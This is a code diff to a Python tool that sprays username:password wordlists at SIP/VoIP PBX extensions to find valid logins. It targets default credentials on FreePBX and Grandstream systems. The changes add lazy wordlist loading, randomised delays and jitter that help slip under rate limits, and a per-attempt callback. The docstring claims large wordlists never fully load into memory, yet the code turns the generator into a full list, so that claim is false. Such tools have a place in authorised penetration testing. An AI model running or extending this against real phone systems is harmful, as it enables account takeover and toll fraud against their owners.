@@ -36,9 +36,12 @@ class CredHit:
     evidence: str
 
 
-def load_credentials(path: str) -> list[tuple[str, str]]:
-    """Parse a credentials file. Format: username:password per line."""
-    creds: list[tuple[str, str]] = []
+def load_credentials(path: str) -> Generator[tuple[str, str], None, None]:
+    """Parse a credentials file lazily. Format: username:password per line.
+
+    Yields (username, password) pairs one at a time so arbitrarily large
+    wordlists (e.g. rockyou 14 M lines) never fully load into RAM.
+    """
     with open(path) as f:
         for line in f:
             line = line.strip()
@@ -46,8 +49,7 @@ def load_credentials(path: str) -> list[tuple[str, str]]:
                 continue
             if ":" in line:
                 u, p = line.split(":", 1)
-                creds.append((u, p))
-    return creds
+                yield u, p
 
 
 def _try_invite(
@@ -258,7 +260,7 @@ def _try_register(
 def spray(
     host: str,
     extensions: list[str],
-    cred_pairs: list[tuple[str, str]],
+    cred_pairs,                          # list or generator of (username, password)
     port: int = 5060,
     timeout: float = 3.0,
     max_workers: int = 10,
@@ -272,22 +274,46 @@ def spray(
     use_tls: bool = False,
     method: str = "REGISTER",
     hash_log_path: str | None = None,
+    delay_ms: float = 0,
+    jitter_ms: float = 0,
+    on_attempt=None,
 ) -> list[CredHit]:
     """Spray creds across extensions in parallel — bounded memory design.
 
     Work is generated lazily: only max_workers*2 futures exist at any moment.
-    The credential list is never duplicated per extension in memory.
-    Only successful hits are stored; failed attempts are discarded immediately.
+    cred_pairs may be a list *or* a generator so 14 M-line wordlists never
+    fully load into RAM.  Only successful hits are stored.
 
     smart_self_password: also try (ext, ext) and (ext, "") — extremely common
                          on FreePBX/Grandstream where admins leave defaults.
-    max_failures_per_ext: stop after N failures per extension to avoid lockout.
+    max_failures_per_ext: stop after N consecutive failures per extension to
+                          avoid lockout; the extension is skipped with a log
+                          message when the threshold is reached.
+    delay_ms:   fixed inter-attempt delay in milliseconds (default 0).
+    jitter_ms:  max random extra delay added on top of delay_ms (default 0).
+                Total sleep per attempt is bounded to delay_ms + jitter_ms ms.
+                # default: ~N attempts/sec per extension  (N = 1000/delay_ms
+                #          when delay_ms > 0; otherwise limited by network RTT)
+    on_attempt: optional callback(ext, username, password, result) called for
+                every attempt — result is the CredHit (success or failure).
+                Pass None to disable.  Runs inside the worker thread.
     """
+    import random as _random
+    import time as _time
+
     local_ip = source_ip if source_ip else local_ip_for(host)
     hits: list[CredHit] = []
     stop_for_ext: dict[str, threading.Event] = {e: threading.Event() for e in extensions}
     fail_counts: dict[str, int] = {e: 0 for e in extensions}
     lock = threading.Lock()
+
+    # Materialise cred_pairs once so a generator is consumed only once and
+    # then reused cheaply per extension in _work_gen.
+    cred_pairs_list: list[tuple[str, str]] = list(cred_pairs)
+
+    # Pre-compute bounded inter-attempt delay (ms → seconds).
+    _delay_s = delay_ms / 1000.0
+    _jitter_s = jitter_ms / 1000.0
 
     def _work_gen() -> Generator[tuple[str, str, str], None, None]:
         """Yield (ext, username, password) lazily — never builds full list."""
@@ -313,7 +339,7 @@ def spray(
                     if item:
                         yield item
             # Wordlist: try as-stored username first, then reuse password with ext
-            for u, p in cred_pairs:
+            for u, p in cred_pairs_list:
                 for candidate in (_emit(u, p), _emit(ext, p) if u != ext else None):
                     if candidate:
                         yield candidate
@@ -324,6 +350,12 @@ def spray(
     def _attempt(ext: str, u: str, p: str) -> CredHit | None:
         if stop_for_ext[ext].is_set():
             return None
+
+        # Bounded inter-attempt delay with optional jitter.
+        if _delay_s > 0 or _jitter_s > 0:
+            sleep_for = _delay_s + (_random.random() * _jitter_s if _jitter_s > 0 else 0.0)
+            _time.sleep(sleep_for)  # bounded: never exceeds delay_ms + jitter_ms ms
+
         ok, ev = _try_fn(host, ext, u, p, port=port, local_ip=local_ip,
                          timeout=timeout, traffic_log=traffic_log,
                          tcp=tcp, use_tls=use_tls, **_extra_kw)
@@ -334,19 +366,26 @@ def spray(
                     stop_for_ext[ext].set()
                 if traffic_log:
                     traffic_log.write(f"[LOCKOUT] ext={ext} {ev}\n")
-                return CredHit(ext, u, p, False, ev)
+                result = CredHit(ext, u, p, False, ev)
+                if on_attempt is not None:
+                    on_attempt(ext, u, p, result)
+                return result
             if "429" in ev or "503" in ev or "too many" in ev_lower:
-                import time as _t
-                _t.sleep(3.0)
+                _time.sleep(3.0)
                 # Signal lockout so the extension gets stopped
                 with lock:
                     stop_for_ext[ext].set()
-                return CredHit(ext, u, p, False, f"LOCKOUT: {ev}")
+                result = CredHit(ext, u, p, False, f"LOCKOUT: {ev}")
+                if on_attempt is not None:
+                    on_attempt(ext, u, p, result)
+                return result
             if "403" in ev and ("forbidden" in ev_lower or "too many" in ev_lower):
-                import time as _t
-                _t.sleep(2.0)
+                _time.sleep(2.0)
+        result = CredHit(ext, u, p, ok, ev)
+        if on_attempt is not None:
+            on_attempt(ext, u, p, result)
         if ok:
-            return CredHit(ext, u, p, True, ev)
+            return result
         return None
 
     # Bounded submission: keep at most max_workers*2 futures in flight
